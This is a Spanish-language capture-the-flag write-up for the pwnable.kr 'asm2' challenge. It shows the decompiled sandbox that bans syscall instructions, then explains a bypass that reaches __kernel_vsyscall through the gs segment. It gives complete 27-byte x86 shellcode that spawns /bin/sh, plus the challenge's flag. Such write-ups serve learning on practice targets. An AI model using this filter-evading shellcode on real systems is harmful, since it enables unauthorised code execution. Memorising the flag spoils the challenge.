# asm2

![img](https://raw.githubusercontent.com/Calana2/Wargame_Writeups/refs/heads/main/pwnable.kr/Hackers_Secret/asm2.png)

```C
  read(0,code_ptr + stub_len,27);
  for (i = 0; i < 27; i = i + 1) {
    stub_len = strlen(stub);
    if (code_ptr[i + stub_len] == (code)0x0) {
      puts("remove null bytes in your input");
      exit(0);
    }
  }
  stub_len = strlen(stub);
  n = sandbox(code_ptr + stub_len);
  if (n != 0) {
    puts("caught by filter!");
    exit(0);
  }

undefined4 sandbox(char *code)

{
  char *pcVar1;
  undefined4 uVar2;
  
  pcVar1 = strstr(code,&DAT_00012008);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = strstr(code,"\x0f4");
    if (pcVar1 == (char *)0x0) {
      pcVar1 = strchr(code,0x65);
      if (pcVar1 == (char *)0x0) {
        uVar2 = 0;
      }
      else {
        uVar2 = 1;
      }
    }
    else {
      uVar2 = 1;
    }
  }
  else {
    uVar2 = 1;
  }
  return uVar2;
}
```

El programa nos permite ejecutar un shellcode con una longitud de hasta 27 bytes sin bytes nulos y con ciertas instrucciones prohibidas: \xcd\x80 (int 0x80), \x0f\x34 (sysenter), \x65 (?).

El programa mapea dos regiones de memoria RW en direcciones aleatorias. La primera es usada para contener el código ejecutable y luego de pasar las verificaciones cambia sus permisos a RE. La segunda es usada como "stack", ESP apunta a ella justo antes de saltar al shellcode.

Antes de nuestro shellcode hay un stub:
```
pwndbg> disass &stub
Dump of assembler code for function stub:
   0x56559008 <+0>:     xor    eax,eax
   0x5655900a <+2>:     xor    ebx,ebx
   0x5655900c <+4>:     xor    ecx,ecx
   0x5655900e <+6>:     xor    edx,edx
   0x56559010 <+8>:     xor    edi,edi
   0x56559012 <+10>:    xor    esi,esi
   0x56559014 <+12>:    xor    ebp,ebp
```

Se ve que el stub no toca los registros de segmento. En programas Linux x86 de 32 bits con glibc, gs apunta al [TCB](https://research.cs.wisc.edu/sonar/projects/xcalls/doc/htm/structtcbhead__t.html) (Thread Control Block):
```C
typedef struct {
  void *tcb;
  dtv_t *dtv;
  void *self;
  int multiple_threads;
  uintptr_t sysinfo;            // offset 0x10, puntero a __kernel_vsyscall
  uintptr_t stack_guard;        // 0ffset 0x18, el típico canario de la pila
  ....
} tcbhead_t
```

`__kernel_vsyscall` es una función dentro de [vDSO](https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/02/13/vsyscall-and-vdso) (virtual Dynamic Shared Object), una pequeña biblioteca que el kernel mapea en memoria para acelerar acceso a algunas syscalls:
```
pwndbg> disass 0xf7fc4570
Dump of assembler code for function __kernel_vsyscall:
   0xf7fc4570 <+0>:     push   ecx
   0xf7fc4571 <+1>:     push   edx
   0xf7fc4572 <+2>:     push   ebp
   0xf7fc4573 <+3>:     mov    ebp,esp
   0xf7fc4575 <+5>:     sysenter
   0xf7fc4577 <+7>:     int    0x80
   0xf7fc4579 <+9>:     pop    ebp
   0xf7fc457a <+10>:    pop    edx
   0xf7fc457b <+11>:    pop    ecx
   0xf7fc457c <+12>:    ret
   0xf7fc457d <+13>:    int3
End of assembler dump.
```

Como se puede observar, esta función realiza una syscall, apuntando a ella podríamos ejecutar syscalls indirectamente. Podría usarse la instrucción `call dword [gs:0x10]` pero debido a que esto se traduce a `65ff 1510 0000 00` no podemos usarla porque contiene el byte 0x65, como se vio anteriormente.

No obstante podemos hacer ds=gs para que al hacer \[reg] se resuelva la dirección en ds:reg.
```asm
BITS 32
start:
  mov eax, gs
  mov ds, ax              
  mov ebp, [ebx + 0x10]   
```

Esto almacena la dirección de `__kernel_vsyscall` en ebp. Se traduce a `8ce8 8ed8 8b6b 10`, por lo tanto nos quedan solo 20 bytes para escribir el shellcode:
```asm
BITS 32
start:
  mov eax, gs
  mov ds, ax
  mov ebp, [ebx + 0x10]
  push 0x68732f2f        ; "hs//"
  push 0x6e69622f        ; "nib/"
  mov ebx, esp
  xor eax, eax
  mov al, 0x0b
  jmp ebp
times 27 - ($-$$) db 90h
```

`I_l1ke_1nt3l_CPU_ov3rki1l_FeaTures`
